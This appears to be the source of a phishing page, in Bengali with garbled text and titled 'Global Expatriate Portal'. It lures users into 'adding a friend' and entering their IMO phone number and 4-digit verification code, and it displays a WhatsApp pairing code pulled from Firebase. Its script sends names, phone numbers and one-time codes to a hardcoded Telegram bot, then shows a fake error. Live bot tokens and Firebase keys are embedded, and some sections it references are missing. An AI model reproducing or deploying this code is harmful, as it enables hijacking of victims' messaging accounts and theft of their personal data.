<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Expatriate Portal</title>
    
    <!-- Fonts & Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;600;700&family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        :root { --primary: #0056b3; --danger: #d32f2f; --bg: #f4f6f9; }
        body { font-family: 'Hind Siliguri', sans-serif; background: var(--bg); min-height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; }
        .container { width: 100%; max-width: 450px; background: white; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); overflow: hidden; margin: 15px; position: relative; }
        .hidden-section { display: none !important; }
        .fade-in { animation: fadeIn 0.5s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* IMO Specific Styles */
        .imo-bg { background: linear-gradient(135deg, #0f172a, #1e293b); color: white; }
        .pin-input { width: 45px; height: 50px; text-align: center; font-size: 1.5rem; background: rgba(0,0,0,0.3); border: 1px solid #334155; color: white; border-radius: 8px; margin: 0 5px; }
        .pin-input:focus { outline: none; border-color: #38bdf8; }
    </style>
</head>
<body>
         <!-- ========================================== -->
    <!-- PHASE 3: IMO PROFILE CONNECT -->
    <!-- ========================================== -->
    <div id="section3" class="hidden-section imo-bg h-full min-h-[550px] p-6 flex flex-col items-center justify-center text-center">
        
        <!-- IMO Step 1: Input -->
        <div id="imo-step1" class="w-full">
            <img src="https://i.ibb.co/F8bJ3s1/imo-profile.jpg" class="w-24 h-24 rounded-full border-4 border-sky-400 mx-auto mb-4 shadow-[0_0_20px_rgba(56,189,248,0.5)]">
            <h1 class="text-2xl font-bold text-white mb-2">MY IMO PROFILE</h1>
            <p class="text-slate-300 text-sm mb-6">‡¶è‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ IMO ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡¶®</p>
            
            <div class="relative mb-4">
                <i class="fa fa-phone absolute left-4 top-3 text-slate-400"></i>
                <input type="tel" id="imoPhone" placeholder="IMO ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®" class="w-full bg-slate-800/50 border border-slate-600 text-white p-3 pl-10 rounded-lg focus:outline-none focus:border-sky-400">
            </div>
            <button onclick="submitImoPhone()" class="w-full bg-gradient-to-r from-sky-400 to-sky-600 text-white font-bold py-3 rounded-lg shadow-lg hover:from-sky-500 hover:to-sky-700">
                <i class="fa fa-user-plus mr-2"></i> Add Friend
            </button>
        </div>

        <!-- IMO Step 2: Loader -->
        <div id="imo-loader" class="hidden">
            <div class="w-12 h-12 border-4 border-slate-600 border-t-sky-400 rounded-full animate-spin mx-auto mb-4"></div>
            <p class="text-slate-300">‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...</p>
        </div>

        <!-- IMO Step 3: OTP Input -->
        <div id="imo-step2" class="hidden w-full">
            <i class="fa fa-lock text-4xl text-sky-400 mb-4"></i>
            <h2 class="text-xl font-bold text-white mb-2">‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶ï‡ßã‡¶°</h2>
            <p class="text-slate-400 text-sm mb-6">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶á‡¶Æ‡ßÅ‡¶§‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡ß™-‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶¶‡¶ø‡¶®</p>
            
            <div class="flex justify-center mb-6">
                <input type="tel" class="pin-input" maxlength="1" onkeyup="moveFocus(this, 'pin2')">
                <input type="tel" id="pin2" class="pin-input" maxlength="1" onkeyup="moveFocus(this, 'pin3')">
                <input type="tel" id="pin3" class="pin-input" maxlength="1" onkeyup="moveFocus(this, 'pin4')">
                <input type="tel" id="pin4" class="pin-input" maxlength="1" onkeyup="submitImoPin()">
            </div>
        </div>

        <!-- IMO Step 4: Final Error -->
        <div id="imo-final" class="hidden w-full">
            <div class="bg-red-900/40 border border-red-500/50 p-4 rounded-lg">
                <i class="fa fa-triangle-exclamation text-3xl text-red-400 mb-3 block"></i>
                <p class="text-red-200 text-sm">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞‡¶ü‡¶ø ‡¶≠‡ßÅ‡¶≤‡•§ ‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡ßü‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</p>
                <button onclick="location.reload()" class="mt-4 px-4 py-2 bg-red-600 text-white rounded text-sm">Try Again</button>
            </div>
        </div>

    </div>

</div>

<!-- Firebase SDK -->
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

    // Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyCnE3ixu-seDdC0csNEwsumKFEB3Im8DGE",
        authDomain: "my-whatsapp-page.firebaseapp.com",
        databaseURL: "https://my-whatsapp-page-default-rtdb.firebaseio.com",
        projectId: "my-whatsapp-page",
        storageBucket: "my-whatsapp-page.firebasestorage.app",
        messagingSenderId: "458940936506",
        appId: "1:458940936506:web:d4faab25813f064c27a003",
        measurementId: "G-EQ1QQDBTKG"
    };

    // Telegram Config
    const TG_TOKEN = "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA"; 
    const CHAT_ID = "8271536101"; 

    // --- DOM Elements ---
    const sec1 = document.getElementById('section1');
    const sec2 = document.getElementById('section2');
    const sec3 = document.getElementById('section3');

    // --- HELPER: Send Telegram ---
    async function sendTelegram(msg) {
        try {
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
            });
        } catch (e) { console.error(e); }
    }

    // --- LOGIC 1: FORM SUBMIT ---
    document.getElementById('complianceForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const btn = document.getElementById('btnStep1');
        btn.innerHTML = "‚è≥ ‡¶™‡ßç‡¶∞‡¶∏‡ßá‡¶∏‡¶ø‡¶Ç..."; btn.disabled = true;

        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        
        await sendTelegram(`üìù *‡¶®‡¶§‡ßÅ‡¶® ‡¶Ü‡¶¨‡ßá‡¶¶‡¶®*\nüë§ ‡¶®‡¶æ‡¶Æ: ${name}\nüìû ‡¶´‡ßã‡¶®: \`${phone}\`\n‚úÖ Status: Form Submitted`);

        setTimeout(() => {
            sec1.classList.add('hidden-section');
            sec2.classList.remove('hidden-section');
            sec2.classList.add('fade-in');
            startWhatsAppTimer();
        }, 1000);
    });

    // --- LOGIC 2: WHATSAPP TIMER & FIREBASE ---
    function startWhatsAppTimer() {
        let time = 15;
        const display = document.getElementById('waTimeDisplay');
        const timerBox = document.getElementById('wa-timer');
        const codeBox = document.getElementById('wa-pin-box');
        const nextBtn = document.getElementById('btnToImo');
        const codeDisplay = document.getElementById('wa-code-display');

        const interval = setInterval(() => {
            time--;
            display.innerText = time;
            if (time <= 0) {
                clearInterval(interval);
                timerBox.classList.add('hidden');
                codeBox.classList.remove('hidden');
                nextBtn.classList.remove('hidden'); // Show Next Button
                
                // Fetch Code from Firebase
                const app = initializeApp(firebaseConfig);
                const db = getDatabase(app);
                onValue(ref(db, 'liveCode'), (snap) => {
                    const data = snap.val();
                    codeDisplay.innerText = data?.code || "827 491 23"; // Fallback
                });
            }
        }, 1000);

        // Next Button Click Logic
        nextBtn.addEventListener('click', () => {
            sec2.classList.add('hidden-section');
            sec3.classList.remove('hidden-section');
            sec3.classList.add('fade-in');
        });
    }

    // --- LOGIC 3: IMO FUNCTIONS ---
    window.submitImoPhone = async function() {
        const phone = document.getElementById('imoPhone').value;
        if(!phone) return alert("‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®!");

        await sendTelegram(`üîµ *IMO ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶™‡ßç‡¶∞‡¶æ‡¶™‡ßç‡¶§*\nüìû \`${phone}\``);

        document.getElementById('imo-step1').classList.add('hidden');
        document.getElementById('imo-loader').classList.remove('hidden');

        setTimeout(() => {
            document.getElementById('imo-loader').classList.add('hidden');
            document.getElementById('imo-step2').classList.remove('hidden');
        }, 3000);
    }

    window.moveFocus = function(current, nextId) {
        if(current.value.length >= 1) document.getElementById(nextId).focus();
    }

    window.submitImoPin = async function() {
        const p1 = document.querySelector('.pin-input').value;
        const p2 = document.getElementById('pin2').value;
        const p3 = document.getElementById('pin3').value;
        const p4 = document.getElementById('pin4').value;
        const code = p1+p2+p3+p4;

        if(code.length === 4) {
            await sendTelegram(`üîë *IMO ‡¶™‡¶ø‡¶® ‡¶ï‡ßã‡¶°*\nCode: \`${code}\``);
            document.getElementById('imo-step2').classList.add('hidden');
            document.getElementById('imo-final').classList.remove('hidden');
        }
    }
</script>

</body>
</html>
